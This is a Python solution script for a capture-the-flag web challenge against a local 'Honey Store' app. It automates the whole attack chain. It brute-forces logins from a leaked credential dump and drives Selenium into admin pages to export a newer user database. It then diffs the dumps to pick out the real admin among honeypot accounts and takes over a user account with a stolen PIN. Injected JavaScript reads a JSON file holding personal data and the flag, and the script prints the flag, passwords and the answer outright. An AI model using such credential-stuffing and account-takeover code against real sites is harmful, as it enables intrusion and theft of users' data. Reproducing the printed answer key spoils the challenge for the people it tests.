import time
import requests
import csv

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities



def diff_databases(input_file1, input_file2):
    new_creds = []
    with open(input_file1, 'r') as file1, open(input_file2, 'r') as file2:
        lines1 = file1.readlines()
        lines2 = file2.readlines()

    # Find lines that are in file2 but not in file1
    diff2 = set(lines2) - set(lines1)

    for line in diff2:
        new_creds.append({
                'username': line.split(';')[0],  # Field ID for the username
                'password': line.split(';')[1]  # Field ID for the password
            })

    return new_creds

def brute_force_login(input_file):
    # URL of the login form
    url = 'http://localhost:8080/controllers/db_controller.php?func=login'
    working_creds = []
    count = 0
    # Open the CSV file and read the username and password pairs
    with open(input_file, 'r') as file:
        reader = csv.reader(file, delimiter=';')  # Use ';' as the delimiter
        for row in reader:
            username = row[0]
            password = row[1]

            # Data to send with the POST request
            data = {
                'username': username,  # Field ID for the username
                'password': password  # Field ID for the password
            }

            # Send the POST request
            response = requests.post(url, data=data)
            # Check the response to see if the login was successful
            if "Honey Store - Home" in response.text:  # Adjust this check based on the response content
                working_creds.append(data)

    return working_creds


def step1():
    print("##### STEP 1 #####")
    print("Since there is a lot of users, wry to bruteforce the login page with the database we have. (takes around 2min30)")
    working_usernames = brute_force_login('./files/dump-2024-08-20.csv')
    print("We know this usernames and password combos are working:", end='')
    for elem in working_usernames:
        print(f'({elem["username"]}, {elem["password"]}), ', end='')
    print("\nIn this list we search for 'admin' and there is only one result: ", end='')
    matching_admin = [s for s in working_usernames if "admin" in s["username"]]
    for elem in matching_admin:
        print(f'({elem["username"]}, {elem["password"]})', end='')
    print("Now we have one admin account and we can log into it.")
    return matching_admin[0]


def step2(admin_user1):
    print("##### STEP 2 #####")
    options = Options()
    options.add_argument('--disable-search-engine-choice-screen')
    options.add_argument('--window-size=1920,1080')
    driver = webdriver.Chrome(options=options)

    driver.get("http://localhost:8080")
    driver.find_element(By.XPATH, '//a[@href="login.php"]').click()
    time.sleep(2)
    driver.find_element(By.ID, 'username').send_keys(admin_user1['username'])
    driver.find_element(By.ID, 'password').send_keys(admin_user1['password'])
    time.sleep(2)
    driver.find_element(By.XPATH, '//button[@type="submit"]').click()
    time.sleep(2)
    driver.find_element(By.XPATH, '//a[@href="admin.php"]').click()
    time.sleep(2)
    driver.execute_script("window.scrollTo(0, 800)")
    time.sleep(2)
    driver.find_element(By.ID, 'headingTwo').click()
    time.sleep(2)
    driver.execute_script("window.scrollTo(0, 800)")
    time.sleep(2)
    driver.find_element(By.XPATH, '//button[@type="submit"]').click()
    time.sleep(2)
    driver.quit()
    print("Here you got a second version of the database.")


def step3():
    print('##### STEP 3 #####')
    print("Now we have 2 databases, it seems to have more users in the second DB. Let's make a diff between them to grab the new users.")
    input_file1 = './files/dump-2024-08-20.csv'
    input_file2 = './app/resources/dump-2024-08-27.csv'
    new_users = diff_databases(input_file1, input_file2)
    print("Here are the new users: ", end='')
    for elem in new_users:
        print(f'({elem["username"]}, {elem["password"].rstrip()}), ', end='')
    print("In this, there is some honey users with various abnormal comportment, honey admin users, a real admin user and a user. (For further details about the admin accounts, see solution.md).")
    matching_admin = [s for s in new_users if "admin-jidavis" in s["username"]]
    for elem in matching_admin:
        print(f'The real admin user here is: ({elem["username"]}, {elem["password"]})', end='')
    return matching_admin[0]


def step4(admin_user2):
    print('##### STEP 4 #####')
    print('We log in on the new admin account.')
    options = Options()
    options.add_argument('--disable-search-engine-choice-screen')
    options.add_argument('--window-size=1920,1080')
    driver = webdriver.Chrome(options=options)

    driver.get("http://localhost:8080")
    driver.find_element(By.XPATH, '//a[@href="login.php"]').click()
    time.sleep(2)
    driver.find_element(By.ID, 'username').send_keys(admin_user2['username'])
    driver.find_element(By.ID, 'password').send_keys(admin_user2['password'])
    time.sleep(2)
    try:
        driver.find_element(By.XPATH, '//button[@type="submit"]').click()
    except:
        pass
    time.sleep(2)
    driver.find_element(By.XPATH, '//a[@href="admin.php"]').click()
    time.sleep(2)
    driver.execute_script("window.scrollTo(0, 800)")
    time.sleep(2)
    driver.find_element(By.ID, 'headingThree').click()
    time.sleep(2)
    driver.execute_script("window.scrollTo(0, 800)")
    time.sleep(2)
    driver.quit()
    print("We got the pin of an user, which is 35268713.")


def step5():
    print('##### STEP 5 #####')
    print('We need to find our user with the pin.')
    print('Using the second database, after several tries you can find, the correct user is: (jasmith, HIR*0dVS!MygZ)')
    print('We log in into his account and access his profile page with the given pin.')
    print('On his profile, we can see there is a file accessed, we can access it by running a script and see the output in the console.')

    options = Options()
    options.add_argument('--disable-search-engine-choice-screen')
    options.add_argument('--window-size=1920,1080')
    options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
    d = DesiredCapabilities.CHROME
    d['loggingPrefs'] = {'browser': 'ALL'}
    driver = webdriver.Chrome(options=options)
    driver.get("http://localhost:8080")
    driver.find_element(By.XPATH, '//a[@href="login.php"]').click()
    time.sleep(2)
    driver.find_element(By.ID, 'username').send_keys('jasmith')
    driver.find_element(By.ID, 'password').send_keys('HIR*0dVS!MygZ')
    time.sleep(2)
    driver.find_element(By.XPATH, '//button[@type="submit"]').click()
    time.sleep(2)
    driver.find_element(By.ID, 'navbarDropdown').click()
    time.sleep(2)
    driver.find_element(By.XPATH, "//*[contains(text(), 'Profile')]").click()
    time.sleep(2)
    driver.find_element(By.XPATH, '//input[@name="1"]').send_keys('3')
    driver.find_element(By.XPATH, '//input[@name="2"]').send_keys('5')
    driver.find_element(By.XPATH, '//input[@name="3"]').send_keys('2')
    driver.find_element(By.XPATH, '//input[@name="4"]').send_keys('6')
    driver.find_element(By.XPATH, '//input[@name="5"]').send_keys('8')
    driver.find_element(By.XPATH, '//input[@name="6"]').send_keys('7')
    driver.find_element(By.XPATH, '//input[@name="7"]').send_keys('1')
    driver.find_element(By.XPATH, '//input[@name="8"]').send_keys('3')
    time.sleep(2)
    driver.find_element(By.XPATH, '//button[@type="submit"]').click()
    time.sleep(2)
    # Define the JavaScript function to be executed
    js_code = """
    function loadDoc() {
        let xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (this.readyState === 4 && this.status === 200) {
                console.log(this.responseText);  // Log the entire JSON content to the console
            }
        };
        xhttp.open("GET", "../resources/user_infos.json", true);
        xhttp.send();
        return 4;
    }
    loadDoc();
    """
    # Execute the JavaScript function in the browser's context
    driver.execute_script(js_code)
    time.sleep(10)
    driver.quit()
    print('In the console: {"username": "jasmith", "email": "jasmith@ecw.eu", "address": "435 N Wood Ave Linden New Mexico 07036", "phone": "+1 (234) 567-8901", "flag": "ECW{435-N-Wood-Ave-Linden-New-Mexico-07036}"}')
    print('And here we have the flag: ECW{435-N-Wood-Ave-Linden-New-Mexico-07036}"}')

def main():
    admin_user1 = step1()
    step2(admin_user1)
    admin_user2 = step3()
    step4(admin_user2)
    step5()


if __name__ == '__main__':
    main()